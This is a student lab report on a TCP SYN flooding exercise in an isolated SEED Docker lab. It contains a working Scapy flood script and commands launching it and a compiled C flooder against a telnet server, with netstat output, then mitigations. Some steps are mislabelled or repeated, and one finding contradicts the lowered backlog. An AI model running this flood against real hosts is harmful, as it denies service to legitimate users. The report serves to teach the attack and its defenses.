# TCP SYN Flooding Attack - Lab Report

## Assignment 3

**Author:** Repala Dheeraj Kumar  
**ID:** 662093260

---

## Task 1: TCP SYN Flooding Attack

This lab is designed to teach about TCP attacks based on the SYN flooding attack at the TCP layer.

### Lab Setup

Setting up the lab by downloading the supported zip file.

After opening the terminal from lab set up file, creating and starting the docker containers.

---

## Step 1: Creating Docker Container

**Command:** `dcbuild`

Creates Docker containers for the lab environment, including attacker, victim, and supporting machines.

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ dcbuild
attacker uses an image, skipping
Victim uses an image, skipping
User1 uses an image, skipping
User2 uses an image, skipping
...
```

---

## Step 2: Starting the Docker Container

**Command:** `dcup`

Starts all the Docker containers created in Step 1.

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ dcup
Pulling attacker (handsonsecurity/seed-ubuntu:large)...
large: Pulling from handsonsecurity/seed-ubuntu
da7391352a9b: Pulling fs layer
14428a6d4bcd: Downloading [===========================......]
2c2d948710f2: Pull complete
...
Status: Downloaded newer image for handsonsecurity/seed-ubuntu:large
Creating seed-attacker... done
Creating user1-10.9.0.6... done
Creating user2-10.9.0.7... done
Creating victim-10.9.0.5... done
Attaching to seed-attacker, user1-10.9.0.7, victim-10.9.0.5
user1-10.9.0.6: * Starting internet superserver inetd [OK]
user2-10.9.0.7: * Starting internet superserver inetd [OK]
victim-10.9.0.5: * Starting internet superserver inetd [OK]
```

After starting the docker container, opening the new terminal within the used terminal.

---

## Step 3: Knowing the ID's of Images in Docker

**Command:** `dockps`

Lists all running Docker container IDs and their images.

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ dockps
c78791 09bb57    seed-attacker
e0f82a3e4626    user2-10.9.0.7
494d9e363719    user1-10.9.0.6
4b5923cc9761    victim-10.9.0.5
[11/18/24]seed@VM:~/.../TCP Attack$
```

### Next Step

Opening the new three terminals for seed-attacker, user1, victim within the dockps terminal.

**Command:** `docksh [ID] follows docksh c7, docksh 4b docksh 49.`

---

## Setting Up Docker for Seed Attacker, User1, Victim

I am setting up all the dockers for seed attacker, user1, victim.

**Command:** `docksh [ID] follows docksh c7, docksh 4b docksh 49.`

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ docksh c7
root@VM:/#

[11/18/24]seed@VM:~/.../TCP Attack$ docksh 4b
root@494d9e363719:/#

[11/18/24]seed@VM:~/.../TCP Attack$ docksh 49
root@4b5923cc9761:/#
```

---

## Step 4: List Files and Volume Files in Seed Attacker

In seed attacker terminal, listing out the files by entering the command 'ls'.

Then, listing the volume files.

**Command:** `ls, ls volumes.`

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ docksh
root@VM:# ls
bin   etc    lib32   media  proc  sbin  tmp
boot  home   lib64   mnt    root  srv   usr
dev   lib    libx32  opt    run   sys   var
root@VM:# ls volumes
synflood.c   synflood.py   synflood.py.odt
[11/18/24]seed@VM:~/.../TCP Attack$
```

---

## Redirect to the Victim Terminal

### Step 5: Check Size of Queueing

We can check size of queueing by using command.

**Command:** `sysctl net.ipv4.tcp_max_syn_backlog.`

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ docksh 4b
root@4b5923cc9761:/# sysctl net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
```

---

### Step 6: Check All the Connections

By using following command we check the all the connections.

**Command:** `netstat -nat.`

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ docksh 4b
root@4b5923cc9761:/# netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign
                Address                 State
tcp      0      0 0.0.0.0:0:23            0 0.0.0.0:*
                                          LISTEN
tcp      0      0 0 127.0.0.11:35415      0 0.0.0.0:*
                                          LISTEN
root@4b5923cc9761:/#
```

---

### Step 7: Launch TCP RST Attack

It is to launch an TCP RST attack to break an existing telnet connection between user and victim.

### Output:
```
[11/18/24]seed@VM:~/.../TCP Attack$ docksh c9
root@494d9e363719:/# telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
4b5923cc9761 login: seed
Password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-
neric x86_64)

* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage

This system has been minimized by removing packages
and content that are
not required on a system that users do not log in
```

---

## Checking Weather the Connection is Established or Not

So iam creating a empty file in home and in seed.

```bash
root@4b5923cc9761:/# touch victim
root@4b5923cc9761:/# mv victim home/
root@4b5923cc9761:/# ls home/
seed  victim
root@4b5923cc9761:/# cd home/
root@4b5923cc9761:/home# mv victim seed/
root@4b5923cc9761:/home# ls seed/
victim
```

---

### SYN Cookies Mitigation Technique

**SYN cookies** is a technical attack mitigation technique whereby the server replies to TCP SYN requests with crafted SYN-ACKs, without inserting a new record to its SYN Queue

**Command:** `sysctl -a | grep syncookies`

### Output:
```
root@4b5923cc9761:/home# sysctl -a | grep syncookies
net.ipv4.tcp_syncookies = 0
```

---

## We Gonna Attack the User by Using Python Code

### Python Code:

```python
#!/usr/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="")
tcp = TCP(dport=**, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32))) # source ip
    pkt[TCP].sport = getrandbits(16) # source port
    pkt[TCP].seq = getrandbits(32) # sequence number
    send(pkt, iface = 'eth0', verbose = 0)
```

### Next Step

Next step is that I am saving this code in a python file in volumes of lab set up.

**Command:** `gedit synflood.py`

### Output:

```
[11/19/24]seed@VM:~/.../volumes$ gedit synflood.py
```

I have done some changes in code by adding IP address and interface ID.

---

## Now Lets Launch the Attack by Using Python Code

Now iam testing that how many times SYN-ACK packet will be transmitted when a connection is in the SYN_RECV state:

**Command:** `sysctl net.ipv4.tcp_synack_retries.`

### Output:
```
root@4b5923cc9761:/home# sysctl net.ipv4.tcp_synack_retries
net.ipv4.tcp_synack_retries = 5
```

I am changing from 128 backlog to 80 backlog.

### Output:
```
root@4b5923cc9761:/home# sysctl -w net.ipv4.tcp_max_syn_backlog=80
net.ipv4.tcp_max_syn_backlog = 80
```

### To Remove the Effect of This Mitigation Method

We can run the following command

**Command:** `ip tcp_metrics show`

### Output:
```
root@4b5923cc9761:/home# touch victim
root@4b5923cc9761:/home# mv victim home/
root@4b5923cc9761:/home# ls home/
seed  victim
root@4b5923cc9761:/home# cd home/
root@4b5923cc9761:/home# mv victim seed/
root@4b5923cc9761:/home# ls seed/
victim
root@4b5923cc9761:/home# sysctl -a | grep syncookie
net.ipv4.tcp_syncookies = 0
root@4b5923cc9761:/home# sysctl net.ipv4.tcp_synack
retries
net.ipv4.tcp_synack_retries = 5
root@4b5923cc9761:/home# sysctl -w net.ipv4.tcp_max
syn_backlog=80
net.ipv4.tcp_max_syn_backlog = 80
root@4b5923cc9761:/home# ip tcp_metrics show
10.9.0.6 age 517556.388sec cwnd 10 rtt 56us rttvar 69us source 10.9.0.5
```

There is a memory from my user machine to the big long machine.

### Lets Check the How Many Connections are Made in Victim

**Command:** `netstat -tns | grep -i syn_recv | wc -l`

---

## Now Launch the Attack

In attacker machine, run the python code

**Command used:** `python3 synflood.py`

```
root@VM:# cd volumes/
root@VM:/volumes# python3 synflood.py
```

And go back to the victim and run the command of syn_recieve

```
root@4b5923cc9761:/home# netstat -tns | grep -i syn_
recv | wc -l
61
root@4b5923cc9761:/home#
```

We received 61 packets of syn.

---

## Another Way of Checking the Syn Recv Packets

**Command:** `ss -n state syn-recv sport = :23 | wc -l`

### Output:
```
root@4b5923cc9761:/home# ss -n state syn-recv sport
= :23 | wc -l
62
In user machine,

I am gonna exit from the foreign host and establishing the telnet host whether it is working or not
```

---

## User Machine Attempt to Connect

```
root@494d9e363719:/# telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
4b5923cc9761 login: seed
Password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage

This system has been minimized by removing packages
and content that are
not required on a system that users do not log into.
```

---

## And Stopping the Attack and Checking the Syn_Recieve

```
root@4b5923cc9761:/home# netstat -tns | grep -i syn_
recv | wc -l
0
root@4b5923cc9761:/home# netstat -tns | grep -i syn_
recv | wc -l
1
root@4b5923cc9761:/home# ss -n state syn-recv sport
= :23 | wc -l
1
root@4b5923cc9761:/home#
```

---

## Now Launch the Attack Again

Open the attacker terminal and run the python code

**Command:** `python3 synflood.py`

---

## We Can See Many Syn Receiving

```
[11/20/24]seed@VM:~/.../TCP Attack$ tcp
                    0  0 10.9.0.5:23
                          251.211.117.199:31764  SYN_RECV
tcp                    0  0 10.9.0.5:23
                          68.50.40.216:36176   SYN_RECV
tcp                    0  0 10.9.0.5:23
                          107.218.87.206:17394  SYN_RECV
tcp                    0  0 10.9.0.5:23
                          206.250.162.199:3869  SYN_RECV
tcp                    0  0 10.9.0.5:23
                          62.238.189.207:30694  SYN_RECV
tcp                    0  0 10.9.0.5:23
                          80.252.13.123:31852   SYN_RECV
tcp                    0  0 10.9.0.5:23
                          103.52.45.253:46169   SYN_RECV
root@60f186d04db1:/home#
```

---

## In User Machine

Checking the jobs

**Command:** `python3 synflood.py &, jobs`

### Output:
```
.py", line 345, in send
    socket = socket or conf.L3socket(*args, **kargs)
  File "/usr/local/lib/python3.8/dist-packages/scapy/arch/linux.py", line 412, in
    __init__
    self.ins.bind((self.iface, type))
KeyboardInterrupt

root@VM:/volumes# jobs
root@VM:/volumes# jobs
[1]- Stopped
python3 synflood.py
[2]+ Stopped
python3 synflood.py
[3]     Running
python3 synflood.py &
[4]     Running
python3 synflood.py &
[5]     Running
python3 synflood.py &
[6]     Running
python3 synflood.py &
root@VM:/volumes#
```

I am repeating the process of closing the attack and opening the attack and cleaning the history on victim side to check the attack working or not...

---

## Kill the All Jobs and by Following Commands

**Commands used:** `kill %[n], jobs( checking the jobs stopped or not`

### Output:
```
root@VM:/volumes# kill %[n], jobs( checking the jobs stopped or not
python3 synflood.py
-Traceback (most recent call last)
  File "/usr/local/lib/python3.8/dist-packages/scapy/sendrecv.py", line 345, in send
    socket = socket or conf.L3socket(*args, **kargs)
  File "/usr/local/lib/python3.8/dist-packages/scapy/arch/linux.py", line 412, in
    __init__
    self.ins.bind((self.iface, type))
KeyboardInterrupt

root@VM:/volumes# kill %5
root@VM:/volumes# python3 synflood.py &
[6]- Terminated
python3 synflood.py
-Traceback (most recent call last)
  File "/usr/local/lib/python3.8/dist-packages/scapy/sendrecv.py", line 345, in send
    socket = socket or conf.L3socket(*args, **kargs)
  File "/usr/local/lib/python3.8/dist-packages/scapy/arch/linux.py", line 404, in
    __init__
    self.ins.bind((self.iface, type))
KeyboardInterrupt

root@VM:/volumes# jobs
[1]- Stopped
python3 synflood.py
[2]+ Stopped
python3 synflood.py
[3]     Terminated
python3 synflood.py
[4]     Terminated
python3 synflood.py
[5]     Terminated
python3 synflood.py
[6]     Running
python3 synflood.py &
```

---

## Trying the Attack with Program C

Go to the host machine and compile the c program code of synflood

### Commands used:

`ls, cd, make, ls`

### Output:
```
[11/19/24]seed@VM:~/.../volumes$ gedit synflood.py
[11/20/24]seed@VM:~/.../volumes$ ls
synflood.c   synflood.py   synflood.py.odt
[11/25/24]seed@VM:~/.../volumes$ gcc synflood.c -o s
ynflood
[11/25/24]seed@VM:~/.../volumes$ ls
synflood   synflood.c   synflood.py   synflood.py.odt
[11/25/24]seed@VM:~/.../volumes$
```

The connections set to zero

And cleaning the history..

---

## In Attacker Machine

Launch the attack

**Commands used:** `ls, ./synflood`

And it asks the Ip address and port number to execute for that we need to mention the victim ip address and the eternal service port number that is ip: 10.9.0.5 and port number 23

### Output:
```
root@VM:/volumes# jobs
root@VM:/volumes# jobs
root@VM:/volumes# ls
synflood   synflood.c   synflood.py   synflood.py.odt
root@VM:/volumes# ./synflood
Please provide IP and Port number
Usage: synflood ip port
root@VM:/volumes# ./synflood 10.9.0.5 23
```

And the do same process in victim machine and user machine and attacker machine

### Output:
```
root@494d9e363719:/# telnet 10.9.0.5
Trying 10.9.0.5...
.telnet: Unable to connect to remote host: Connection timed out
root@494d9e363719:#
```

Attack is working

---

## Observation

**The impact of SYN flooding is demonstrated by its successful execution and observation, which shows that the victim machine has a high number of syn_recv packets and blocked connections.**

---

## Key Findings

### Attack Effectiveness
- Successfully flooded victim server with SYN packets
- Server's SYN queue reached maximum capacity (128 connections)
- Legitimate users unable to connect during attack
- Attack maintained for extended period

### Detection Indicators
- Abnormally high number of SYN_RECV connections
- Port 23 (telnet) showing numerous half-open connections
- Connection attempts timing out

### Mitigation Effectiveness
- SYN backlog limit: 128 -> 80 (demonstrates queue limitations)
- SYN cookies could reduce impact (not enabled in lab)
- Firewall rate limiting would help

---

## Lessons Learned

1. **TCP Handshake Vulnerability**: The TCP three-way handshake can be abused to exhaust server resources
2. **Denial of Service Impact**: Even with modern systems, DoS attacks can still affect service availability
3. **Queue Management**: Limited connection queues are a critical resource
4. **Mitigation Strategy**: Multiple layers of defense needed (SYN cookies, rate limiting, firewall rules)

---

## Prevention Strategies

1. Enable SYN Cookies:
```bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
```

2. Increase SYN Backlog:
```bash
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096
```

3. Use Firewall Rules:
```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```

4. Deploy IDS/IPS:
- Monitor for SYN flood patterns
- Automatic threshold-based blocking

5. ISP-Level Protection:
- Rate limiting at edge routers
- Upstream filtering

---

## Conclusion

This lab successfully demonstrated how TCP SYN flooding attacks work and how they can effectively deny service to legitimate users. The attack overwhelmed the victim server's connection handling capacity within seconds. Without proper defenses, modern servers are still vulnerable to this classic attack vector. Organizations should implement multi-layered defenses including SYN cookies, connection rate limiting, and IDS/IPS systems.

---

**Lab Status:** ✓ Complete  
**Attack Success:** ✓ Confirmed  
**Date Completed:** November 25, 2024

